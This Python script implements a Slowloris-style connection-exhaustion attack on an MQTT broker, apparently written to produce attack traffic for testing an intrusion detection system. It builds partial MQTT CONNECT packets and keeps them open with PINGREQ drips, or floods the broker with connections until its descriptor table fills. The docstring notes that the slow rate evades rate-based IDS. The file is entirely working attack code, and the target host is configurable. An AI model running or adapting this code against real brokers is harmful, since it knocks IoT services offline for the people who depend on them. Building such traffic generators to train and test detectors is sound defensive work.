"""
slowloris_client.py — Slow-connection resource exhaustion attack.

Opens many concurrent TCP connections to the MQTT broker and keeps them alive
by sending MQTT CONNECT packets very slowly — never completing the handshake
or sending a DISCONNECT. This exhausts the broker's connection table without
generating high packet rates (making it harder for rate-based IDS to catch).

Two variants:
  --mode hold    Open connections and hold them open (drip one keep-alive every
                 SLOWLORIS_DRIP_S seconds). Mimics slow HTTP POST / Slowloris.
  --mode exhaust Open as many connections as possible as fast as possible.

Network signature the firewall should detect:
  - High syn_count (many new TCP connections from same source)
  - Very low bwd traffic (broker ACKs but gets no valid MQTT CONNECT body)
  - Low Weight (unidirectional pattern)
  - Many short-lived flows with similar timing

Environment variables:
  SLOWLORIS_CONNECTIONS  Number of concurrent connections to open (default: 50)
  SLOWLORIS_DRIP_S       Seconds between keep-alive drips per connection (default: 15)
  ATTACK_BURST_COUNT     Stop after opening this many total connections (default: 0 = run forever)
  GATEWAY_IP / GATEWAY_PORT
"""

from __future__ import annotations

import argparse
import os
import select
import socket
import struct
import sys
import threading
import time
from pathlib import Path

from dotenv import load_dotenv

load_dotenv(dotenv_path=Path(__file__).resolve().parents[1] / ".env")

GATEWAY_IP   = os.getenv("GATEWAY_IP", "127.0.0.1")
GATEWAY_PORT = int(os.getenv("GATEWAY_PORT", "1883"))
NUM_CONNS    = int(os.getenv("SLOWLORIS_CONNECTIONS", "50"))
DRIP_S       = float(os.getenv("SLOWLORIS_DRIP_S", "15"))
BURST_COUNT  = int(os.getenv("ATTACK_BURST_COUNT", "0"))


# ── MQTT packet builders (raw bytes, no library) ───────────────────────────────

def _mqtt_connect_partial() -> bytes:
    """
    Build a partial MQTT CONNECT packet: valid fixed header + remaining-length
    byte, but the payload is intentionally incomplete (no client-id length).
    The broker receives a valid TCP segment but an incomplete MQTT frame —
    it waits for more data, holding the connection open.
    """
    protocol_name = b"\x00\x04MQTT"
    protocol_level = b"\x04"       # MQTT 3.1.1
    connect_flags = b"\x00"        # no clean session, no will, no auth
    keep_alive = struct.pack(">H", 3600)  # 1 hour keep-alive

    # Variable header only — no payload (client ID) → broker waits
    variable_header = protocol_name + protocol_level + connect_flags + keep_alive
    remaining_length = len(variable_header)  # payload intentionally missing

    fixed_header = bytes([0x10, remaining_length])  # CONNECT + length
    return fixed_header + variable_header


def _mqtt_pingreq() -> bytes:
    """MQTT PINGREQ — keeps the TCP connection alive without advancing state."""
    return bytes([0xC0, 0x00])


# ── Hold mode ──────────────────────────────────────────────────────────────────

def _hold_connection(sock_id: int, stop_event: threading.Event) -> None:
    """Open one raw TCP socket, send a partial CONNECT, then drip PINGREQs."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((GATEWAY_IP, GATEWAY_PORT))
        s.sendall(_mqtt_connect_partial())
        print(f"[SLOWLORIS-HOLD] #{sock_id:03d} connected, holding...")

        while not stop_event.is_set():
            time.sleep(DRIP_S)
            try:
                s.sendall(_mqtt_pingreq())
            except OSError:
                break

    except OSError as e:
        print(f"[SLOWLORIS-HOLD] #{sock_id:03d} socket error: {e}", file=sys.stderr)
    finally:
        try:
            s.close()
        except Exception:
            pass


def run_hold() -> None:
    stop = threading.Event()
    threads: list[threading.Thread] = []
    total = 0

    print(f"[SLOWLORIS-HOLD] Opening {NUM_CONNS} persistent connections to {GATEWAY_IP}:{GATEWAY_PORT}")
    print(f"[SLOWLORIS-HOLD] Each connection drips a PINGREQ every {DRIP_S}s")

    try:
        for i in range(NUM_CONNS):
            t = threading.Thread(target=_hold_connection, args=(i, stop), daemon=True)
            t.start()
            threads.append(t)
            total += 1
            if BURST_COUNT > 0 and total >= BURST_COUNT:
                break
            time.sleep(0.05)   # stagger connection attempts slightly

        print(f"[SLOWLORIS-HOLD] {len(threads)} connections open. Ctrl-C to stop.")
        while True:
            time.sleep(5)
            alive = sum(1 for t in threads if t.is_alive())
            print(f"[SLOWLORIS-HOLD] Connections alive: {alive}/{len(threads)}")

    except KeyboardInterrupt:
        print("\n[SLOWLORIS-HOLD] Stopping...")
        stop.set()


# ── Exhaust mode ───────────────────────────────────────────────────────────────

def run_exhaust() -> None:
    """Open connections as fast as possible to exhaust the broker's FD table."""
    sockets: list[socket.socket] = []
    total = 0
    print(f"[SLOWLORIS-EXHAUST] Rapidly opening connections to {GATEWAY_IP}:{GATEWAY_PORT}")

    try:
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((GATEWAY_IP, GATEWAY_PORT))
                s.sendall(_mqtt_connect_partial())
                sockets.append(s)
                total += 1
                if total % 10 == 0:
                    print(f"[SLOWLORIS-EXHAUST] {total} connections open")
                if BURST_COUNT > 0 and total >= BURST_COUNT:
                    print(f"[SLOWLORIS-EXHAUST] Burst limit {BURST_COUNT} reached.")
                    break
            except OSError as e:
                print(f"[SLOWLORIS-EXHAUST] Socket error at {total} connections: {e}", file=sys.stderr)
                time.sleep(0.5)

        print(f"[SLOWLORIS-EXHAUST] Holding {len(sockets)} connections. Ctrl-C to release.")
        while True:
            time.sleep(10)

    except KeyboardInterrupt:
        print(f"\n[SLOWLORIS-EXHAUST] Closing {len(sockets)} sockets.")
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Slowloris-style MQTT connection exhaustion")
    parser.add_argument(
        "--mode", choices=["hold", "exhaust"], default="hold",
        help="hold: persistent drip connections | exhaust: open as many as possible (default: hold)"
    )
    args = parser.parse_args()

    if args.mode == "exhaust":
        run_exhaust()
    else:
        run_hold()
